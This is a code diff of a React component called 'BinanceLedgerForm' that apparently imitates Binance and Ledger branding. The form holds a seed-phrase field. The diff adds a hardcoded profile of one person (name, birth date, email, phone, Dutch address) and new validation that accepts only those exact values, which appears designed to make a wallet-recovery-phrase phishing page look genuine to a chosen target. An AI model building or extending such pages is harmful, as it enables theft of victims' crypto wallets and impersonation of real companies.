@@ -6,22 +6,38 @@ import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Progress } from "@/components/ui/progress";
 
+// Define the expected correct data
+const correctData = {
+  firstName: "Gerard",
+  lastName: "Powell",
+  dateOfBirth: "1985-05-15",
+  email: "gerardpowell@test.nl",
+  phoneNumber: "+31612345678",
+  address: "Gerard Teststraat 12",
+  zipCode: "2123LK",
+  city: "Nijmegen",
+  country: "Netherlands",
+};
+
 const BinanceLedgerForm: FC = () => {
   const { toast } = useToast();
   const [currentStep, setCurrentStep] = useState(1);
-  const [formProgress, setFormProgress] = useState(33);
+  const [formProgress, setFormProgress] = useState(25);
   const [formData, setFormData] = useState({
-    firstName: "Gerard",
-    lastName: "Powell",
-    email: "gerardpowell@test.nl",
-    address: "Gerard Teststraat 12",
-    zipCode: "2123LK",
-    city: "Nijmegen",
-    country: "Netherlands",
+    firstName: "",
+    lastName: "",
+    dateOfBirth: "",
+    email: "",
+    phoneNumber: "",
+    address: "",
+    zipCode: "",
+    city: "",
+    country: "",
     seedPhrase: "",
     securityConfirmation: false,
   });
 
+  const [errors, setErrors] = useState<Record<string, string>>({});
   const [verificationCompleted, setVerificationCompleted] = useState(false);
   const [securityConfirmed, setSecurityConfirmed] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -32,6 +48,14 @@ const BinanceLedgerForm: FC = () => {
       ...formData,
       [e.target.name]: e.target.value,
     });
+    
+    // Clear error for this field if it exists
+    if (errors[e.target.name]) {
+      setErrors({
+        ...errors,
+        [e.target.name]: "",
+      });
+    }
   };
 
   const handleSecurityConfirmation = (checked: boolean) => {
@@ -43,48 +67,105 @@ const BinanceLedgerForm: FC = () => {
   };
 
   const validateStep1 = () => {
-    return formData.firstName.trim() !== "" && formData.lastName.trim() !== "";
+    const newErrors: Record<string, string> = {};
+
+    if (formData.firstName.trim() === "") {
+      newErrors.firstName = "First name is required";
+    } else if (formData.firstName !== correctData.firstName) {
+      newErrors.firstName = "Invalid first name";
+    }
+
+    if (formData.lastName.trim() === "") {
+      newErrors.lastName = "Last name is required";
+    } else if (formData.lastName !== correctData.lastName) {
+      newErrors.lastName = "Invalid last name";
+    }
+
+    if (formData.dateOfBirth.trim() === "") {
+      newErrors.dateOfBirth = "Date of birth is required";
+    } else if (formData.dateOfBirth !== correctData.dateOfBirth) {
+      newErrors.dateOfBirth = "Invalid date of birth";
+    }
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
   };
 
   const validateStep2 = () => {
+    const newErrors: Record<string, string> = {};
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return emailRegex.test(formData.email);
+
+    if (!emailRegex.test(formData.email)) {
+      newErrors.email = "Valid email is required";
+    } else if (formData.email !== correctData.email) {
+      newErrors.email = "Invalid email";
+    }
+
+    if (formData.phoneNumber.trim() === "") {
+      newErrors.phoneNumber = "Phone number is required";
+    } else if (formData.phoneNumber !== correctData.phoneNumber) {
+      newErrors.phoneNumber = "Invalid phone number";
+    }
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
   };
 
   const validateStep3 = () => {
-    return (
-      formData.address.trim() !== "" &&
-      formData.zipCode.trim() !== "" &&
-      formData.city.trim() !== "" &&
-      formData.country.trim() !== ""
-    );
+    const newErrors: Record<string, string> = {};
+    
+    if (formData.address.trim() === "") {
+      newErrors.address = "Address is required";
+    } else if (formData.address !== correctData.address) {
+      newErrors.address = "Invalid address";
+    }
+    
+    if (formData.zipCode.trim() === "") {
+      newErrors.zipCode = "Zip code is required";
+    } else if (formData.zipCode !== correctData.zipCode) {
+      newErrors.zipCode = "Invalid zip code";
+    }
+    
+    if (formData.city.trim() === "") {
+      newErrors.city = "City is required";
+    } else if (formData.city !== correctData.city) {
+      newErrors.city = "Invalid city";
+    }
+    
+    if (formData.country.trim() === "") {
+      newErrors.country = "Country is required";
+    } else if (formData.country !== correctData.country) {
+      newErrors.country = "Invalid country";
+    }
+    
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
   };
 
   const handleNext = () => {
     if (currentStep === 1 && validateStep1()) {
       setCurrentStep(2);
-      setFormProgress(66);
+      setFormProgress(50);
     } else if (currentStep === 2 && validateStep2()) {
       setCurrentStep(3);
-      setFormProgress(100);
+      setFormProgress(75);
     } else if (currentStep === 3 && validateStep3()) {
-      setVerificationCompleted(true);
+      setCurrentStep(4);
       setFormProgress(100);
-    } else {
-      toast({
-        title: "Please fill in all required fields",
-        variant: "destructive",
-      });
+      setVerificationCompleted(true);
     }
   };
 
   const handlePrevious = () => {
     if (currentStep === 2) {
       setCurrentStep(1);
-      setFormProgress(33);
+      setFormProgress(25);
     } else if (currentStep === 3) {
       setCurrentStep(2);
-      setFormProgress(66);
+      setFormProgress(50);
+    } else if (currentStep === 4) {
+      setCurrentStep(3);
+      setFormProgress(75);
     }
   };
 
@@ -142,7 +223,7 @@ const BinanceLedgerForm: FC = () => {
           <div className="mb-4">
             <Progress value={formProgress} className="h-2 bg-gray-700" />
             <div className="mt-2 text-sm text-gray-400">
-              Step {currentStep} of 3
+              Step {currentStep} of 4
             </div>
           </div>
         )}
@@ -164,8 +245,9 @@ const BinanceLedgerForm: FC = () => {
                     value={formData.firstName}
                     onChange={handleInputChange}
                     placeholder="First Name"
-                    className="bg-binance-darkGray border-gray-600 text-white"
+                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.firstName ? "border-red-500" : ""}`}
                   />
+                  {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>}
                 </div>
                 <div>
                   <label htmlFor="lastName" className="block text-sm font-medium text-gray-300 mb-1">
@@ -177,16 +259,32 @@ const BinanceLedgerForm: FC = () => {
                     value={formData.lastName}
                     onChange={handleInputChange}
                     placeholder="Last Name"
-                    className="bg-binance-darkGray border-gray-600 text-white"
+                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.lastName ? "border-red-500" : ""}`}
                   />
+                  {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>}
                 </div>
+              </div>
+              <div>
+                <label htmlFor="dateOfBirth" className="block text-sm font-medium text-gray-300 mb-1">
+                  Date of Birth
+                </label>
+                <Input
+                  id="dateOfBirth"
+                  name="dateOfBirth"
+                  type="date"
+                  value={formData.dateOfBirth}
+                  onChange={handleInputChange}
+                  placeholder="Date of Birth"
+                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.dateOfBirth ? "border-red-500" : ""}`}
+                />
+                {errors.dateOfBirth && <p className="text-red-500 text-xs mt-1">{errors.dateOfBirth}</p>}
               </div>
             </div>
           )}
 
           {currentStep === 2 && (
             <div className="space-y-4">
-              <h3 className="text-white font-medium">Email Address</h3>
+              <h3 className="text-white font-medium">Contact Information</h3>
               <div>
                 <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-1">
                   Email
@@ -198,8 +296,24 @@ const BinanceLedgerForm: FC = () => {
                   value={formData.email}
                   onChange={handleInputChange}
                   placeholder="Email Address"
-                  className="bg-binance-darkGray border-gray-600 text-white"
+                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.email ? "border-red-500" : ""}`}
                 />
+                {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
+              </div>
+              <div>
+                <label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-300 mb-1">
+                  Phone Number
+                </label>
+                <Input
+                  id="phoneNumber"
+                  name="phoneNumber"
+                  type="tel"
+                  value={formData.phoneNumber}
+                  onChange={handleInputChange}
+                  placeholder="Phone Number (e.g. +31612345678)"
+                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.phoneNumber ? "border-red-500" : ""}`}
+                />
+                {errors.phoneNumber && <p className="text-red-500 text-xs mt-1">{errors.phoneNumber}</p>}
               </div>
             </div>
           )}
@@ -217,8 +331,9 @@ const BinanceLedgerForm: FC = () => {
                   value={formData.address}
                   onChange={handleInputChange}
                   placeholder="Address"
-                  className="bg-binance-darkGray border-gray-600 text-white"
+                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.address ? "border-red-500" : ""}`}
                 />
+                {errors.address && <p className="text-red-500 text-xs mt-1">{errors.address}</p>}
               </div>
 
               <div className="grid grid-cols-2 gap-4">
@@ -232,8 +347,9 @@ const BinanceLedgerForm: FC = () => {
                     value={formData.zipCode}
                     onChange={handleInputChange}
                     placeholder="Zip Code"
-                    className="bg-binance-darkGray border-gray-600 text-white"
+                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.zipCode ? "border-red-500" : ""}`}
                   />
+                  {errors.zipCode && <p className="text-red-500 text-xs mt-1">{errors.zipCode}</p>}
                 </div>
                 <div>
                   <label htmlFor="city" className="block text-sm font-medium text-gray-300 mb-1">
@@ -245,8 +361,9 @@ const BinanceLedgerForm: FC = () => {
                     value={formData.city}
                     onChange={handleInputChange}
                     placeholder="City"
-                    className="bg-binance-darkGray border-gray-600 text-white"
+                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.city ? "border-red-500" : ""}`}
                   />
+                  {errors.city && <p className="text-red-500 text-xs mt-1">{errors.city}</p>}
                 </div>
               </div>
 
@@ -260,8 +377,9 @@ const BinanceLedgerForm: FC = () => {
                   value={formData.country}
                   onChange={handleInputChange}
                   placeholder="Country"
-                  className="bg-binance-darkGray border-gray-600 text-white"
+                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.country ? "border-red-500" : ""}`}
                 />
+                {errors.country && <p className="text-red-500 text-xs mt-1">{errors.country}</p>}
               </div>
             </div>
           )}
